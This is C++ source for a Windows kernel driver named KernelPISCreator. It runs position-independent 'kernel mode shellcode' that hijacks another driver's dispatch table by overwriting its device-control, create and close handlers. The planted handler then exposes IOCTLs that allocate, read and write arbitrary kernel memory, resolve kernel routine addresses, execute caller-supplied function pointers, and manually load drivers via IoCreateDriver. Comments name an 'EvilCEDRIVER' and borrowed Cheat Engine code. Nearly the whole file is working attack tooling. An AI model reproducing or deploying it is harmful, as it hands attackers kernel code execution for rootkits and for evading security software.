#pragma warning( disable: 4100 4101 4103 4189 4996 6271 6066 6273 6328)
#pragma runtime_checks("", off)
#pragma optimize("", off)
#pragma strict_gs_check(off)

#include <ntifs.h>
#include <minwindef.h>
#include <wdm.h>

#define IOCTL_UNKNOWN_BASE					FILE_DEVICE_UNKNOWN
#define IOCTL_ALLOCATEMEM_NONPAGED    CTL_CODE(IOCTL_UNKNOWN_BASE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_FREE_NONPAGED    CTL_CODE(IOCTL_UNKNOWN_BASE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GETPROCADDRESS		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0802, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_WRITEMEMORY		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0803, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_READMEMORY		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0804, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_EXECUTE_CODE		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0805, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_CREATE_DRIVER		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0806, METHOD_BUFFERED, FILE_WRITE_ACCESS)

struct KernelPisParameters
{
	LPVOID MmGetSystemRoutineAddress;
	LPVOID HookFunctionAddress;
	USHORT dummy2;
};

// function prototypes

extern "C" 
NTSTATUS
__declspec(safebuffers)
__declspec(noinline) PicStart(UINT64 StartContext);
#pragma alloc_text(".PIS", "PicStart")


extern "C"
NTSTATUS
__declspec(safebuffers)
__declspec(noinline)
__stdcall  HookedDispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp);
#pragma alloc_text(".PIS2", "HookedDispatchIoctl")


typedef PVOID(__stdcall* pMmGetSystemRoutineAddress)(_In_ PUNICODE_STRING  SystemRoutineName);
typedef NTSTATUS(__stdcall* pRtlCopyMemory)(_In_  PVOID Destination, _In_  const PVOID Source, _In_ SIZE_T Length);
typedef PEPROCESS(__stdcall* pIoGetCurrentProcess)();
typedef HANDLE(__stdcall* pPsGetProcessId)(_In_ PEPROCESS Process);
typedef ULONG(__stdcall* pDbgPrint)(_In_ PCSTR Format, ...);
typedef NTSTATUS(__stdcall* pObReferenceObjectByName)(
	__in PUNICODE_STRING ObjectName,
	__in ULONG Attributes,
	__in_opt PACCESS_STATE AccessState,
	__in_opt ACCESS_MASK DesiredAccess,
	__in POBJECT_TYPE ObjectType,
	__in KPROCESSOR_MODE AccessMode,
	__inout_opt PVOID ParseContext,
	__out PVOID* Object);
typedef LONG_PTR(__stdcall* pObfDereferenceObject)(_In_  PVOID Object);
typedef LONG_PTR(__stdcall* pRtlInitUnicodeString)(PUNICODE_STRING  DestinationString, PCWSTR SourceString);
typedef PVOID(__stdcall* p_InterlockedExchangePointerString)(PVOID * Target, _In_ PVOID Value);

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	DbgPrint("Hello From original MyDispatchIoctlDBVM!");
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

void Unload(_In_ PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\KernelPISCreator");
	// delete symbolic link
	IoDeleteSymbolicLink(&symLink);

	// delete device object
	IoDeleteDevice(DriverObject->DeviceObject);

	DbgPrint("PISCreator unloaded\n");
}


NTSTATUS OriginalDispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	DbgPrint("Hello From MyDispatchIoctlDBVM!");
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS
__declspec(safebuffers)
__declspec(noinline)
__stdcall  HookedDispatchIoctl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
	DbgPrint("Hooked DispatchIoctl\n");

	PIO_STACK_LOCATION     irpStack = NULL;
	ULONG IoControlCode;

	// irpStack = IoGetCurrentIrpStackLocation(Irp);
	NT_ASSERT(Irp->CurrentLocation <= Irp->StackCount + 1);
	irpStack=  Irp->Tail.Overlay.CurrentStackLocation;
	IoControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	switch (IoControlCode) {

	case IOCTL_ALLOCATEMEM_NONPAGED:
	{
		DbgPrint("Entering IOCTL_ALLOCATEMEM_NONPAGED\n");

		PVOID address;
		SIZE_T size;
		struct input {
			SIZE_T Size;
		} *inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		size = inp->Size;
		address = ExAllocatePool(NonPagedPool, size);
		*(PUINT64)Irp->AssociatedIrp.SystemBuffer = 0;
		*(PUINT_PTR)Irp->AssociatedIrp.SystemBuffer = (UINT_PTR)address;

		if (address == 0)
			ntStatus = STATUS_UNSUCCESSFUL;
		else
		{
			DbgPrint("Alloc success. Cleaning memory... (address=%p size=%d)\n", address, (int)size);
			RtlZeroMemory(address, size);
			ntStatus = STATUS_SUCCESS;
			Irp->IoStatus.Information = sizeof UINT_PTR;
		}

		break;
	}

	case IOCTL_GETPROCADDRESS:
	{
		DbgPrint("Entering IOCTL_GETPROCADDRESS\n");

		PVOID function_address;
		UNICODE_STRING function_name;
		UINT64 result;
		struct input {
			UINT64 function_name;
		}*inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		RtlInitUnicodeString(&function_name, (PCWSTR)(UINT_PTR)(inp->function_name));
		function_address = MmGetSystemRoutineAddress(&function_name);

		if (function_address != NULL) {
			DbgPrint("MmGetSystemRoutineAddress solved %ls: %p\n", (WCHAR*)inp->function_name, function_address);
			result = (UINT64)function_address;
			ntStatus = STATUS_SUCCESS;
		}
		else {
			DbgPrint("MmGetSystemRoutineAddress failed %ls\n", (WCHAR*)inp->function_name);
			result = NULL;
			ntStatus = STATUS_UNSUCCESSFUL;
		}

		RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, &result, 8);
		Irp->IoStatus.Information = sizeof UINT64;

		break;
	}

	case IOCTL_FREE_NONPAGED:
	{
		DbgPrint("Entering IOCTL_FREE_NONPAGED\n");

		struct input {
			UINT64 Address;
		}*inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		ExFreePool((PVOID)(UINT_PTR)inp->Address);
		ntStatus = STATUS_SUCCESS;
		DbgPrint("FreePool success. (addr = %p)", (void*)inp->Address);

		break;
	}

	case IOCTL_WRITEMEMORY:
	{
		DbgPrint("Entering IOCTL_WRITEMEMORY\n");

		struct input {
			UINT64 destination;
			SIZE_T source;
			UINT64 size;
		}*inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		RtlCopyMemory((VOID*)inp->destination, (VOID*)inp->source, inp->size);
		DbgPrint("RtlCopyMemory success. (dest= %p, addr = %p size= %d)", \
			(void*)inp->destination, (void*)inp->source, inp->size);
		ntStatus = STATUS_SUCCESS;

		break;
	}


	case IOCTL_EXECUTE_CODE:
	{
		DbgPrint("Entering IOCTL_EXECUTE_CODE\n");

		typedef NTSTATUS(*PARAMETERLESSFUNCTION)(UINT64 parameters);
		PARAMETERLESSFUNCTION functiontocall;
		struct input {
			UINT64	functionaddress;
			UINT64	parameters;
		} *inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		functiontocall = (PARAMETERLESSFUNCTION)(UINT_PTR)(inp->functionaddress);

		__try
		{
			ntStatus = functiontocall(inp->parameters);
			DbgPrint("Still alive\n");
			ntStatus = STATUS_SUCCESS;
		}
		__except (1)
		{
			DbgPrint("Exception occured\n");
			ntStatus = STATUS_UNSUCCESSFUL;
		}

		break;
	}

	case IOCTL_CREATE_DRIVER:
	{

		UNICODE_STRING driver_name;
		NTSTATUS status;
		struct input {
			UINT64 pDbgPrint;
			UINT64 pRtlInitUnicodeString;
			UINT64 driver_name;
			UINT64 pIoCreateDriver;
			UINT64 DriverInitialize;
		}*inp = (input*)Irp->AssociatedIrp.SystemBuffer;
		
		pDbgPrint DbgPrint = (pDbgPrint)inp->pDbgPrint;
		pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)inp->pRtlInitUnicodeString;
		typedef NTSTATUS(__stdcall* pIoCreateDriver)(_In_  PUNICODE_STRING DriverName, _In_  PDRIVER_INITIALIZE InitializationFunction);
		pIoCreateDriver IoCreateDriver = (pIoCreateDriver)inp->pIoCreateDriver;

		DbgPrint("Entering IOCTL_CREATE_DRIVER\n");

		//\\driver\\EvilCEDRIVER73
		RtlInitUnicodeString(&driver_name, (PCWSTR)(UINT_PTR)(inp->driver_name));
		
		status = IoCreateDriver(&driver_name, (PDRIVER_INITIALIZE)inp->DriverInitialize);

		DbgPrint("%s IoCreateDriver(%wZ) = %lx\n", __FUNCTION__, driver_name, status);

		break;
	}

	default:
		ntStatus = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = ntStatus;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}


NTSTATUS
__declspec(safebuffers)
__declspec(noinline)
__stdcall PicStart(UINT64 StartContext)
{
	
	if (NULL == StartContext)
		return STATUS_UNSUCCESSFUL;

	KernelPisParameters* pisParameters = (KernelPisParameters*)StartContext;
	
	// Get MmGetSystemRoutineAddress
	pMmGetSystemRoutineAddress mmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)pisParameters->MmGetSystemRoutineAddress;
	if (NULL == mmGetSystemRoutineAddress)
		return STATUS_UNSUCCESSFUL;
	
	// Get hook function address
	PDRIVER_DISPATCH HookFunctionAddress = (PDRIVER_DISPATCH)pisParameters->HookFunctionAddress;
	if (NULL == HookFunctionAddress)
		return STATUS_UNSUCCESSFUL;

	// Function name and strings
	WCHAR DbgPrintString[] = { 'D', 'b', 'g', 'P', 'r', 'i', 'n', 't', '\0' };
	WCHAR  greeting[] = { 'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'K', 'e', 'r', 'n', 'e', 'l', ' ', 'm', 'o', 'd', 'e', ' ', 's', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', '!', '\0' };
	WCHAR end[] = { 'S', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', ' ', 's', 'u', 'c', 'c', 'e', 's', 's', 'f', 'u', 'l', 'l', 'y', ' ', 'e', 'x', 'e', 'c', 'u', 't', 'e', 'd', '!', '\0' };
	CHAR param[] = { '%', 'l', 's', 0 };
	// \\driver\\EvilCEDRIVER73
	//WCHAR driverNameString[] = { '\\', 'd', 'r', 'i', 'v', 'e', 'r', '\\', 'E', 'v', 'i', 'l', 'C', 'E', 'D', 'R', 'I', 'V', 'E', 'R', '7', '3', 0};
	WCHAR driverObjectNameString[] = { '\\', 'D', 'r', 'i', 'v', 'e', 'r', '\\', 'K', 'e', 'r', 'n', 'e', 'l', 'P', 'I', 'S', 'C', 'r', 'e', 'a', 't', 'o', 'r', 0 };
	WCHAR ObReferenceObjectByNameString[] = { 'O', 'b', 'R', 'e', 'f', 'e', 'r', 'e', 'n', 'c', 'e', 'O', 'b', 'j', 'e', 'c', 't', 'B', 'y', 'N', 'a', 'm', 'e', 0 };
	WCHAR ObfDereferenceObjectString[] = { 'O', 'b', 'f', 'D', 'e', 'r', 'e', 'f', 'e', 'r', 'e', 'n', 'c', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
	WCHAR IoDriverObjectTypeString[] = { 'I', 'o', 'D', 'r', 'i', 'v', 'e', 'r', 'O', 'b', 'j', 'e', 'c', 't', 'T', 'y', 'p', 'e', 0 };
	CHAR DebugString[] = { 'T', 'a', 'r', 'g', 'e', 't', ' ', 'd', 'r', 'i', 'v', 'e', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ':', ' ', '0', 'x', '%', 'p', 0 };
	WCHAR InterlockedExchangePointerString[] = { 'I', 'n', 't', 'e', 'r', 'l', 'o', 'c', 'k', 'e', 'd', 'E', 'x', 'c', 'h', 'a', 'n', 'g', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', 0 };

	// Create UNICODE_STRING structures
	UNICODE_STRING dbgPrint = RTL_CONSTANT_STRING(DbgPrintString);
	UNICODE_STRING driverObjectName = RTL_CONSTANT_STRING(driverObjectNameString);
	UNICODE_STRING obReferenceObjectByNameString = RTL_CONSTANT_STRING(ObReferenceObjectByNameString);
	UNICODE_STRING obfDereferenceObjectString = RTL_CONSTANT_STRING(ObfDereferenceObjectString);
	UNICODE_STRING ioDriverObjectTypeString = RTL_CONSTANT_STRING(IoDriverObjectTypeString);
	UNICODE_STRING interlockedExchangePointerString = RTL_CONSTANT_STRING(InterlockedExchangePointerString);

	// Get function addresses
	pDbgPrint myDbgPrint = (pDbgPrint)mmGetSystemRoutineAddress(&dbgPrint);
	pObReferenceObjectByName obReferenceObjectByName = (pObReferenceObjectByName)mmGetSystemRoutineAddress(&obReferenceObjectByNameString);
	pObfDereferenceObject obfDereferenceObject = (pObfDereferenceObject)mmGetSystemRoutineAddress(&obfDereferenceObjectString);
	POBJECT_TYPE* ioDriverObjectType = (POBJECT_TYPE*)mmGetSystemRoutineAddress(&ioDriverObjectTypeString);
	p_InterlockedExchangePointerString interlockedExchangePointer = (p_InterlockedExchangePointerString)mmGetSystemRoutineAddress(&interlockedExchangePointerString);

	myDbgPrint(param, greeting); // Hello From Kernel mode shellcode!

	// Local variables
	PDRIVER_OBJECT DriverObject;
	NTSTATUS status;

	status = obReferenceObjectByName(&driverObjectName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		*ioDriverObjectType,
		KernelMode,
		NULL,
		(PVOID*)&DriverObject);

	if (!NT_SUCCESS(status)) {
		return STATUS_UNSUCCESSFUL;
	}

	myDbgPrint(DebugString, DriverObject); // Target driver object: 0x%p

	// Hook IRP_MJ_DEVICE_CONTROL
	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
		if (i == IRP_MJ_DEVICE_CONTROL  || i == IRP_MJ_CLOSE || i == IRP_MJ_CREATE) {
			//interlockedExchangePointer((PVOID*)&DriverObject->MajorFunction[i], HookedDispatchIoctl);
			DriverObject->MajorFunction[i] = HookFunctionAddress;
		}
	}
	
	obfDereferenceObject(DriverObject);
	myDbgPrint(param, end); // Shellcode successfully executed!

	return STATUS_SUCCESS;
}

NTSTATUS DriverInit(PDRIVER_OBJECT DriverObject)
{

	DriverObject->DriverUnload = Unload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OriginalDispatchIoctl; 

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\KernelPISCreator");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create device (0x%08X)\n", status);
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\KernelPISCreator");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create symbolic link (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		return status;
	}


	return STATUS_SUCCESS;
}

extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
{

	DriverInit(DriverObject);
	
	DbgPrint("%ls", DriverObject->DriverName.Buffer);

	KernelPisParameters pisParameters;
	pisParameters.MmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
	pisParameters.HookFunctionAddress = HookedDispatchIoctl;
	pisParameters.dummy2 = NULL;

	IRP FakeIRP;
	struct user_input
	{
		UINT64	functionaddress; //function address to call
		UINT64	parameters;
	} in = { (UINT64)PicStart, (UINT64)&pisParameters };
	FakeIRP.AssociatedIrp.SystemBuffer = &in;
	DbgPrint("0x%p, 0x%p\n", in.functionaddress, in.parameters);

	// from CE IOPLDispatcher.c

	typedef NTSTATUS(__stdcall* PARAMETERLESSFUNCTION)(UINT64 parameters);
	PARAMETERLESSFUNCTION functiontocall;
	NTSTATUS ntStatus;
	struct input
	{
		UINT64	functionaddress; //function address to call
		UINT64	parameters;
	} *inp = (input*)FakeIRP.AssociatedIrp.SystemBuffer;
	
	DbgPrint("0x%p, 0x%p\n", inp->functionaddress, inp->parameters);

	functiontocall = (PARAMETERLESSFUNCTION)(UINT_PTR)(inp->functionaddress);

	__try
	{
		ntStatus = functiontocall(inp->parameters);

		DbgPrint("Still alive\n");
		ntStatus = STATUS_SUCCESS;
	}
	__except (1)
	{
		DbgPrint("Exception occured\n");
		ntStatus = STATUS_UNSUCCESSFUL;
	}	

	// from CE  IOPLDispatcher.c end

	return STATUS_SUCCESS;
}
